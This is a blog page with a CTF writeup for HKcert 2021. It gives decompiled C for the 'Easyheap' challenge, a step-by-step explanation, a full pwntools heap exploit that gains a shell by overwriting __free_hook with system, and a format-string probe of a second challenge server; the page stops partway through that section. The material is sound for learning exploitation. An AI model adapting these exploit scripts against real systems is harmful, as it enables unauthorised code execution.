@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            HKcertCTF 2021 Writeups  &ndash;
+        
+        Blogs
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://bott0n.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
+<meta name="author" content="botton" />
+
+    
+        <meta name="keywords" content='ctf' />
+    
+    
+        <meta name="description" content="" />
+    
+
+<meta property="og:site_name"
+    content='Blogs' />
+
+    <meta property="og:title" content="HKcertCTF 2021 Writeups" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="botton" />
+    <meta
+        property="article:published_time"
+        content='2021-11-17T03:05:19Z&#43;0800' />
+    
+        
+            <meta property="article:tag" content="ctf" />
+        
+    
+    <meta property="og:url" content="https://bott0n.github.io/posts/hkcertctf-2021-writeups/" />
+    <meta property="og:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='bott0n.github.io'
+/>
+<meta property="twitter:url" content="https://bott0n.github.io/posts/hkcertctf-2021-writeups/" />
+
+
+    <meta name="twitter:title" content="HKcertCTF 2021 Writeups" />
+    
+    <meta name="twitter:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Blogs</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/bott0n">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/botton3310">
+    
+    
+        &#xf099;
+    
+    <span>
+        Titter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>HKcertCTF 2021 Writeups</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2021-11-17
+
+</p>
+    
+    
+    
+    <div class="articleToc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#hkcert21---t0028---writeups">HKCERT21 - T0028 - Writeups</a>
+      <ul>
+        <li><a href="#easyheap">Easyheap</a>
+          <ul>
+            <li><a href="#step-1-find-the-vulnerability">Step 1: Find the vulnerability</a></li>
+            <li><a href="#step2-exploit-the-bug">Step2: exploit the bug</a></li>
+            <li><a href="#step-3-leak-libc-address">Step 3: Leak libc address</a></li>
+            <li><a href="#step-4-get-shell">Step 4: Get shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#unobserved-box">Unobserved Box</a>
+          <ul>
+            <li><a href="#step-1-dump-the-source-code-throught-format-string">Step 1: Dump the source code throught format string</a></li>
+            <li><a href="#step-2-reverse">Step 2: Reverse</a></li>
+          </ul>
+        </li>
+        <li><a href="#fortune-cookie-1">Fortune Cookie 1</a>
+          <ul>
+            <li><a href="#step-1-fund-the-vulnerability">Step 1: Fund the vulnerability</a></li>
+            <li><a href="#step-2-leak-address">Step 2: Leak address</a></li>
+            <li><a href="#step-3-leak-libc-address-1">Step 3: Leak libc address</a></li>
+            <li><a href="#step-4-get-shell-1">Step 4: Get shell</a></li>
+          </ul>
+        </li>
+        <li><a href="#fortune-cookie-2">Fortune Cookie 2</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <hr />
+</div>
+
+    <div><h1 id="hkcert21---t0028---writeups">HKCERT21 - T0028 - Writeups</h1>
+<h2 id="easyheap">Easyheap</h2>
+<h3 id="step-1-find-the-vulnerability">Step 1: Find the vulnerability</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">char</span> size;
+  <span style="color:#66d9ef">int</span> user_index;
+  <span style="color:#66d9ef">int</span> i;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>user_ptr;
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>msg_ptr;
+  
+  user_index <span style="color:#f92672">=</span> <span style="color:#ae81ff">999</span>;
+  i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+  <span style="color:#66d9ef">do</span> {
+    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x13</span> <span style="color:#f92672">&lt;</span> i) {
+LAB_001013cc:
+      <span style="color:#66d9ef">if</span> (user_index <span style="color:#f92672">==</span> <span style="color:#ae81ff">999</span>) {
+        puts(<span style="color:#e6db74">&#34;can not add now&#34;</span>);
+      }
+      <span style="color:#66d9ef">else</span> {
+        user_ptr <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">0x20</span>,<span style="color:#ae81ff">1</span>);
+                    <span style="color:#75715e">/* 123 */</span>
+        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> user_ptr;
+        <span style="color:#f92672">**</span>(undefined4 <span style="color:#f92672">**</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">=</span> DAT_0010403c;
+        DAT_0010403c <span style="color:#f92672">=</span> DAT_0010403c <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+        puts(<span style="color:#e6db74">&#34;Enter the message size for the user : &#34;</span>);
+        __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_0010203f,<span style="color:#f92672">&amp;</span>size);
+        <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;\x01&#39;</span>) {
+          puts(<span style="color:#e6db74">&#34;Bye hacker&#34;</span>);
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+          exit(<span style="color:#ae81ff">0</span>);
+        }
+        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> size;
+        msg_ptr <span style="color:#f92672">=</span> calloc((<span style="color:#66d9ef">long</span>)size,<span style="color:#ae81ff">1</span>);
+        puts(<span style="color:#e6db74">&#34;Input message content &gt;&gt;&#34;</span>);
+        read_all(msg_ptr,(<span style="color:#66d9ef">int</span>)size);
+        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#f92672">=</span> msg_ptr;
+      }
+      <span style="color:#66d9ef">return</span>;
+    }
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      user_index <span style="color:#f92672">=</span> i;
+      <span style="color:#66d9ef">goto</span> LAB_001013cc;
+    }
+    i <span style="color:#f92672">=</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+  } <span style="color:#66d9ef">while</span>( true );
+}
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">edit</span>(<span style="color:#66d9ef">void</span>)
+
+{
+  <span style="color:#66d9ef">int</span> index;
+  <span style="color:#66d9ef">char</span> size;
+  
+  puts(<span style="color:#e6db74">&#34;Which user?&#34;</span>);
+  __isoc99_scanf(<span style="color:#f92672">&amp;</span>DAT_00102074,<span style="color:#f92672">&amp;</span>index);
+  <span style="color:#66d9ef">if</span> ((index <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span> (<span style="color:#ae81ff">0x13</span> <span style="color:#f92672">&lt;</span> index)) {
+    puts(<span style="color:#e6db74">&#34;Out of range detected&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+      puts(<span style="color:#e6db74">&#34;Bye hacker&#34;</span>);
+                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+      exit(<span style="color:#ae81ff">0</span>);
+    }
+    size <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
+    puts(<span style="color:#e6db74">&#34;Input message content &gt;&gt;&#34;</span>);
+    read_all(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>),size <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span>
+         <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+  }
+  <span style="color:#66d9ef">return</span>;
+}
+
+</code></pre></div><p>In add function, after created a user_ptr, the program will store the size in *user_ptr+8.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)user_index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> size;
+</code></pre></div><p>In edit function, the program will read size-1 byte and decrease the size and store it when we are finished editing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">read_all(<span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>),size <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+<span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span>
+         <span style="color:#f92672">*</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(<span style="color:#f92672">&amp;</span>user_storage <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)index <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</code></pre></div><h3 id="step2-exploit-the-bug">Step2: exploit the bug</h3>
+<p>Therefore, we can exploit it to get a unlimited size.</p>
+<ol>
+<li>we create a size = 1 chunks.</li>
+<li>we edit it once, the program will decrease the size to be 0</li>
+<li>if we edit it again, the read size will become negative number.</li>
+</ol>
+<p>Which mean we got a most unlimited size to write our data into the chunk.</p>
+<p>Thought this bug, we can create overflow the data to change the size of neighbour chunk&rsquo;s size (this size is the chunk size not the read size) and free it to have a unsorted bin and cause chunks overlap.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;A&#34;</span>)
+<span style="color:#75715e"># chunks for padding</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+    add(<span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># change the size of neighbour</span>
+payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x431</span>)
+edit(<span style="color:#ae81ff">0</span>, payload)
+
+<span style="color:#75715e"># free it to get a unsorted bin</span>
+remove(<span style="color:#ae81ff">1</span>)
+</code></pre></div><h3 id="step-3-leak-libc-address">Step 3: Leak libc address</h3>
+<p>Then, we padding the first chunk to leak and get the libc_base address</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">view(<span style="color:#ae81ff">0</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>)
+libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>
+
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;free_hook: </span><span style="color:#e6db74">{</span>hex(free_hook)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</code></pre></div><h3 id="step-4-get-shell">Step 4: Get shell</h3>
+<p>The last step is edit the first to write __free_hook to victim chunk and edit the victim with system to get shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> p64(free_hook) <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>
+edit(<span style="color:#ae81ff">0</span>, payload)
+
+edit(<span style="color:#ae81ff">2</span>, p64(system))
+remove(<span style="color:#ae81ff">5</span>)
+</code></pre></div><p>Full exploit script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./heap&#39;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chalp.hkcert21.pwnable.hk&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">28359</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+elf <span style="color:#f92672">=</span> ELF(TARGET)
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
+    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.31.so&#39;</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(TARGET, env<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;LD_PRELOAD&#34;</span>: <span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>})
+    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+    gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    c
+</span><span style="color:#e6db74">    heap chunks
+</span><span style="color:#e6db74">    heap bins&#39;&#39;&#39;</span>
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gdb&#39;</span>:
+       gdb<span style="color:#f92672">.</span>attach(p, gdbscript<span style="color:#f92672">=</span>gdbscript)
+
+<span style="color:#75715e">#---</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;1&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Enter the message size for the user :&#34;</span>, str(size))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Input message content &gt;&gt;&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;2&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Want to check the message of which user?&#34;</span>, str(idx))
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;3&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Which user?&#34;</span>, str(idx))
+    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Input message content &gt;&gt;&#34;</span>, data)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>(idx):
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;$&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Delete which user?&#34;</span>, str(idx))
+
+add(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;A&#34;</span>)
+<span style="color:#75715e"># chunks for padding</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+    add(<span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+
+<span style="color:#75715e"># change the size of neighbour</span>
+payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x431</span>)
+edit(<span style="color:#ae81ff">0</span>, payload)
+
+<span style="color:#75715e"># free it to get a unsorted bin</span>
+remove(<span style="color:#ae81ff">1</span>)
+
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
+edit(<span style="color:#ae81ff">0</span>, payload)
+
+view(<span style="color:#ae81ff">0</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>)
+libc_base <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>
+
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc_base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]
+system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
+info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;free_hook: </span><span style="color:#e6db74">{</span>hex(free_hook)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+
+payload <span style="color:#f92672">=</span> p64(free_hook) <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span>
+edit(<span style="color:#ae81ff">0</span>, payload)
+
+edit(<span style="color:#ae81ff">2</span>, p64(system))
+remove(<span style="color:#ae81ff">5</span>)
+
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="unobserved-box">Unobserved Box</h2>
+<h3 id="step-1-dump-the-source-code-throught-format-string">Step 1: Dump the source code throught format string</h3>
+<p>This challenge only give us the server to connect.
+My teammate tell me this challenge may have format string vulnerability when I was sleeping.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>bot3310㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/ctf/hkcert2021/box<span style="color:#f92672">]</span>
+└─$ nc chalp.hkcert21.pwnable.hk <span style="color:#ae81ff">28132</span>                                                                                                                                                                                              <span style="color:#ae81ff">130</span> ⨯ <span style="color:#ae81ff">1</span> ⚙
+%p %x %c %d
+0x7ffee2d4b670 e2d4b670  <span style="color:#ae81ff">1179970944</span> is not the correct answer.
+
+
+</code></pre></div><p>After I few tries, we can&rsquo;t get any useful information from the server.
+However, I remember Liveoverflow has a video talk about a challenge like this.
+<a href="https://www.youtube.com/watch?v=XuzuFUGuQv0&amp;t=450s">https://www.youtube.com/watch?v=XuzuFUGuQv0&amp;t=450s</a></p>
+<p>I wrote a script to dump the source file and pass it to my teammate to reverse it.</p>
